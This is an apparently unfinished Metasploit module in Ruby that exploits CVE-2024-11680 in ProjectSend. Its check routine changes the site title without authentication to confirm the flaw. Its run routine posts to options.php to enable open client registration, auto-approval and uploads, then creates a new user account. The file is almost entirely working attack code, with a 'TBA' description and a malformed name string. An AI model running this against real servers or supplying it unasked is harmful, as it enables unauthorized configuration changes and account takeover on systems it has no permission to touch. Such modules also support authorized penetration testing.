class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck
  CheckCode = Exploit::CheckCode

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ProjectSend New User (CVE-2024-11680',
        'Description' => %q{
          TBA
        },
        'Author' => [
          'D3N14LD15K', # PoC
          'bwatters-r7' # msf module
        ],
        'References' => [
          ['CVE', '2024-11680'],
          ['URL', 'https://github.com/D3N14LD15K/CVE-2024-11680_PoC_Exploit/blob/main/exploit.sh'],
          ['URL', 'https://darkwebinformer.com/proof-of-concept-poc-exploit-for-cve-2024-11680-critical-vulnerability-in-projectsend/']
        ],
        'DisclosureDate' => '2024-12-03',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
                       OptString.new('TARGETURI', [true, 'Base path', '/']),
                       OptString.new('TEMP_TITLE', [true, 'Temporary title to use', Rex::Text.rand_text_alpha(6..12)]),
                       OptString.new('NEW_USERNAME', [true, 'Username to be added', Rex::Text.rand_text_alpha(6..12)]),
                       OptString.new('NEW_PASSWORD', [true, 'Password to be added', Rex::Text.rand_text_alpha(6..12)]),
                     ])
    @csrf_token = nil
    @page_title = nil
    @original_title = nil
  end

  def check
    populate_token_title
    return CheckCode::Unknown unless csrf_token
    return CheckCode::Unknown unless page_title
    @original_title = page_title
    update_title(datastore['TEMP_TITLE'])
    populate_token_title
    return CheckCode::Safe unless page_title == datastore['TEMP_TITLE']

    update_title(@original_title)
    Exploit::CheckCode::Appears
  end

  def page_title
    return @page_title unless @page_title.nil?
    populate_token_title
    return @page_title
  end

  def csrf_token
    return @csrf_token unless @csrf_token.nil?
    populate_token_title
    return @csrf_token
  end

  def populate_token_title
    res = send_request_cgi({
                             'method' => 'GET',
                             'uri' => normalize_uri(target_uri.path, 'index.php')
                           })
    return nil if res.nil? || res.body.nil?
    @csrf_token = res.body.match(/name="csrf_token" value="\K[^"]+/)
    @page_title = res.body.match(/<title>.*?&raquo;\s+(.*?)<\/title>/)[1]
    vprint_status("#{@csrf_token}")
    vprint_status("#{@page_title}")
  end

  def update_title(new_title)
    vprint_status("Updating title to #{new_title}")
    res = send_request_cgi({
                             'method' => 'POST',
                             'uri' => normalize_uri(target_uri.path, 'options.php'),
                             'keep_cookies' => true,
                             'vars_post' => {
                               'csrf_token' => csrf_token,
                               'section' => 'general',
                               'this_install_title' => new_title
                             }
                           })
    return false if res.nil? || res.body.nil? || res.body.include?('Internal Server Error')
    true
  end

  def enable_insecure
    vprint_status('Enabling Insecure Options')
    res = send_request_cgi({
                             'method' => 'POST',
                             'uri' => normalize_uri(target_uri.path, 'options.php'),
                             'keep_cookies' => true,
                             'vars_post' => {
                               'csrf_token' => csrf_token,
                               'section' => 'clients',
                               'client_can_register' => '1',
                               'clients_auto_approve' => '1',
                               'clients_can_upload' => '1'
                             }
                           })
    return false if res.nil? || res.body.nil? || res.body.include?('Internal Server Error')
    true
  end

  def register_user
    vprint_status('Registering User')
    res = send_request_cgi({
                             'method' => 'POST',
                             'uri' => normalize_uri(target_uri.path, 'register.php'),
                             'keep_cookies' => true,
                             'vars_post' => {
                               'csrf_token' => csrf_token,
                               'name' => datastore['NEW_USERNAME'],
                               'username' => datastore['NEW_USERNAME'],
                               'password' => datastore['NEW_PASSWORD'],
                               'email' => '',
                               'address' => 'trash',
                               'phone' => '8675309',
                               'notify_upload' => 'on'
                             }
                           })
    return false if res.nil? || res.body.nil? || res.body.include?('Internal Server Error')
    true
  end

  def run
    vprint_status('TBA')
    enable_insecure
    register_user


  end
end
